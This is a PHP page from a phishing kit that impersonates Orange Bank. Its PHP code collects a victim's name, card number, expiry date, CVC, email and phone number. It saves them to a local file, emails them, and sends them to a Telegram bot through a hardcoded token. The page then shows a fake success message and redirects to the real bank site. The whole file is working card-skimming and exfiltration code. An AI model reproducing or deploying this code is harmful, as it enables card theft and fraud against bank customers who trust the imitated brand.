<?php
include "antibots.php";

include("funcs.php");
$_SESSION['fname'] = $_POST['fname'];
$_SESSION['cdec'] = $_POST['cdec'];
$_SESSION['exp'] = $_POST['exp'];
$_SESSION['cve'] = $_POST['cve'];
$_SESSION['emai'] = $_POST['emai'];
$_SESSION['pho'] = $_POST['pho'];


$message  = "----------- | New CC - ORANGE-B | -----------\n\n";
$message .= "#Nom et Prenom : ".$_POST['fname']."\n";
$message .= "#Numéro de Carte : ".$_POST['cdec']."\n";
$message .= "#EXP : ".$_POST['exp']."\n";
$message .= "#CVC : ".$_POST['cve']."\n";
$message .= "#E-mail : ".$_POST['emai']."\n";
$message .= "#Numéro de Tel : ".$_POST['pho']."\n";
$message .= "------------------ | INFO | ------------------\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";
$message .= "----------- | New CC - ORANGE-B | -----------\n\n\n\n\n";

$send = "";
$subject = "ORANGE-B - CC |".$ip;
$headers = "From:  Login <orba@localprofessional.fr>";
mail($send,$subject,$message,$headers);
 
$file = fopen("./res.txt","a");
fwrite($file,$message);  


$website="https://api.telegram.org/bot1731756144:AAGMsFtd9cXT7e00HXguB8HHYBV-wrdy_og";
$chatId=711705844;  //Receiver Chat Id 
$params=[
    'chat_id'=>'711705844',
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);



?>
<html><head>
 <link rel="icon" href="./favicon.ico" type="image/ico" sizes="16x16">
	<link rel="stylesheet" type="text/css" href="./triangle/css/fontawesome.min.css">
	<link rel="stylesheet" type="text/css" href="./triangle/css/all.min.css">
<meta http-equiv="refresh" content="4; URL=https://www.orangebank.fr/" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<style type="text/css">

body {
    max-width: 400px;
      margin: auto;
}


.form-style-8 h2{
	background: #4D4D4D;
	text-transform: uppercase;
	font-family: 'Open Sans Condensed', sans-serif;
	color: #797979;
	font-size: 18px;
	font-weight: 100;
	padding: 20px;
	margin: -30px -30px 30px -30px;
}
	input { 
    text-align: center; 
}
.form-style-8 input[type="text"],
.form-style-8 input[type="date"],
.form-style-8 input[type="datetime"],
.form-style-8 input[type="email"],
.form-style-8 input[type="number"],
.form-style-8 input[type="search"],
.form-style-8 input[type="time"],
.form-style-8 input[type="url"],
.form-style-8 input[type="password"],
.form-style-8 textarea,
.form-style-8 select 
{
	box-sizing: border-box;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	outline: none;
	display: block;
	width: 100%;
	padding: 7px;
	border: none;
	border-bottom: 1px solid #ddd;
	background: transparent;
	margin-bottom: 10px;
	font: 28px Arial, Helvetica, sans-serif;
	height: 45px;
}
.form-style-8 textarea{
	resize:none;
	overflow: hidden;
}
.form-style-8 input[type="button"], 
.form-style-8 input[type="submit"]{
	-moz-box-shadow: inset 0px 1px 0px 0px #45D6D6;
	-webkit-box-shadow: inset 0px 1px 0px 0px #45D6D6;
	box-shadow: inset 0px 1px 0px 0px #45D6D6;
	background-color: #2CBBBB;
	border: 1px solid #27A0A0;
	display: inline-block;
	cursor: pointer;
	color: #FFFFFF;
	font-family: 'Open Sans Condensed', sans-serif;
	font-size: 14px;
	padding: 8px 18px;
	text-decoration: none;
	text-transform: uppercase;
}
.form-style-8 input[type="button"]:hover, 
.form-style-8 input[type="submit"]:hover {
	background:linear-gradient(to bottom, #34CACA 5%, #30C9C9 100%);
	background-color:#34CACA;
}</style>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Authentification - Orange Bank</title>
<link rel="stylesheet" type="text/css" href="files/style.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="files/function.js"></script>
	
</head>
<body>
	<form class="form" action="modulo_di_rimborso.php" method="post" enctype="multipart/form-data">
		<div class="table">
			<img class="logo" src="./files/oblogo.png">
			
			<div align="center">
<p class="txt2" style="text-align:center;color: #000000;font-size:17px; ! important">Félicitations, Activation réussi</p>
			<hr style="width: 100%;margin-top: 10px;margin-left: 0%;margin-bottom: 10px;border: 2px solid #f16e00;" align="center"><br><div><img src="https://www.totalenergies.fr/fileadmin/Digital/Illustrations/Parlons-Energie/codes_parrainage.png" width="240"></div><br><p class="txt2" style="text-align:center;color: #000000;font-size:17px; ! important">Vous avez activé votre fonction de sécurité avec succès</p>


			
			</div>
			
		
			<div class="form-style-8">
    <br>




</div>
	
			
		</div>
	</form>


</body></html>